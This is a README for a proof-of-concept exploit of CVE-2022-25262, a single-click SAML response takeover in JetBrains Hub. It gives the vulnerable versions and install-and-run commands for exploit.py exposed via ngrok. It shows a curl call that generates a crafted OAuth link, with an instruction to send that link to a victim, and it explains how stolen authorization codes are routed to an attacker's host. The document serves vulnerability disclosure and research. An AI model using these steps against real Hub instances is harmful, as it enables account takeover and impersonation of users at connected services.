# CVE-2022-25262
PoC + vulnerability details for CVE-2022-25262 | JetBrains Hub single-click SAML response takeover

<!-- TOC -->

- [CVE-2022-25262](#cve-2022-25262)
  - [Requirements](#requirements)
  - [Usage](#usage)
  - [How does it work?](#how-does-it-work)
    - [Authorization code pool for "OAuth2 -> SAML" exchange](#authorization-code-pool-for-oauth2---saml-exchange)
    - [YouTrack Konnector OAuth2 authorization code takeover (by design)](#youtrack-konnector-oauth2-authorization-code-takeover-by-design)
    - [Mitigation](#mitigation)

<!-- /TOC -->

## Requirements

- JetBrains Hub <2022.1.14434
- JetBrains Hub configured as SAML IdP 
- Installed "YouTrack Konnektor" service (bundled with YouTrack)

## Usage

Install & run:
```powershell
$ git clone https://github.com/yuriisanin/CVE-2022-25262
$ cd CVE-2022-25262/
$ pip3 install -r requirements.txt
$ python3 exploit.py -h

  usage: exploit.py [-h] [-p P]

  optional arguments:
    -h, --help  show this help message and exit
    -p P        Uvicorn port
    
# If you run the exploit on the local machine, you might need to use Ngrok or alternatives.
$ ngrok http 8000
```

Usage:

1. Use "GET /get-exploit-link" endpoint to get exploit link
2. Send the link to a victim

Query parameters:

| Name | Description | Required |
| ---- | ----------- | -------- |
| **hub_url** | URL of the target Hub instance | ✅ |
| **issuer** | SAML issuer | ✅ |
| **acs_url** | assertion consumer service URL | ✅ |
| **youtrack_url** | URL of the YouTrack instance connected with the Hub (required if guest user is disabled) | ❔ |

Get exploit link:

```powershell
$ curl -v "http://{exploit-host}/get-exploit-link?hub_url=https://hub.jetbrains.com&issuer=jbs.zendesk.com&acs_url=https://jbs.zendesk.com/access/saml"

* Trying {exploit-host-ip}:80...
* Connected to {exploit-host} ({exploit-host-ip}) port 80 (#0)
> GET /get-exploit-link?hub_url=https://hub.jetbrains.com&issuer=jbs.zendesk.com&acs_url=https://jbs.zendesk.com/access/saml HTTP/1.1
> Host: {exploit-host-ip}
> User-Agent: curl/7.77.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 341
< Content-Type: application/json
< Date: Sat, 30 Apr 2022 19:14:45 GMT
< Server: uvicorn
< 
* Connection #0 to host {exploit-host-ip} left intact

{"exploit_url":"https://hub.jetbrains.com/api/rest/oauth2/auth?client_id=fd6b45e6-4a91-4574-9fcf-ebc6926f6378&response_type=code&scope=Hub+YouTrack+TeamCity+Upsource+fd6b45e6-4a91-4574-9fcf-ebc6926f6378&state=fhdyaaf&access_type=offline&redirectURI=https://konnector.services.jetbrains.com/ring/oauth"}

```

**DEMO:**

[![CVE-2022-25262 Demo](https://img.youtube.com/vi/nJGqHy6kyWU/0.jpg)](https://www.youtube.com/watch?v=nJGqHy6kyWU)

## How does it work?

The weakness consists of 2 parts: 
- Usage of OAuth2 authorization code pool for "OAuth2 -> SAML" exchange process.
- Authorization code takeover using YouTrack Konnector integration.

### Authorization code pool for "OAuth2 -> SAML" exchange
 
SAML IdP works as an extension for OAuth. When a specific user wants to login into a specific service provider, he goes through the OAuth authorization code grant flow **(requests 1-2)**, and once the code is obtained it returns the code to the Hub **(request 3)**. Hub takes information about the user associated with the code, and issues a signed SAML response for the service. Even though SAML IdP uses Hub OAuth2 client (client_id=0-0-0-0-0), for the integration, it doesn't check on behalf of which OAuth client the code has been issued. The only thing that matters here is whether the code is valid. It might end up in SAML response takeover if the attacker finds a way to takeover authorization code from any OAuth client registered in the Hub. 

![oauth2-saml-exchange](https://github.com/yuriisanin/CVE-2022-25262/blob/875e07d82357679d745d2ac2aec91d39edd9488f/assets/oauth2-saml.png)

### YouTrack Konnector OAuth2 authorization code takeover (by design)

YouTrack Konnector is a first-party service that allows connecting a specific YouTrack instance with their Slack bot. The service takes the URL address of a YouTrack and both the id and secret of the Konnector OAuth client **(request 1)**. Then it tries to verify that provided URL points to a valid YouTrack by calling several API endpoints **("handshake" requests 2-3)**. If everything goes well, Konnector will return the URL that would allow a specific user to proceed with the OAuth code grant flow **(response 1)**. The URL contains a "state" query parameter that helps Konnector routing OAuth authorization code to the proper handler (Hub instance).
An attacker could create a host with endpoints required for the "handshake" and obtain a "state" parameter that points to the attacker's host. After that, an attacker could craft OAuth authorization URL and send it to a victim.
If the victim clicks on the link and finishes the OAuth flow (the victim needs to have a valid session in Hub), the Konnector service will receive the code and send it to the attacker's host **(requests 4-6)**.

![slack-service-authz-code-takeover](https://github.com/yuriisanin/CVE-2022-25262/blob/875e07d82357679d745d2ac2aec91d39edd9488f/assets/slack-service-authz-code.png)

### Mitigation

The YouTrack team added a check that allows using of authorization codes issued for the "JetBrains Hub Service" OAuth client during the "OAuth2 -> SAML" exchange process. Consequently, there's no way to exchange authorization codes issued for the "YouTrack Konnector" OAuth client. 


## Support

You can follow me on [Twitter](https://twitter.com/SaninYurii), [GitHub](https://github.com/yuriisanin) or [YouTube](https://www.youtube.com/channel/UCLN2EvGxtnucEdrI21PmJZg).
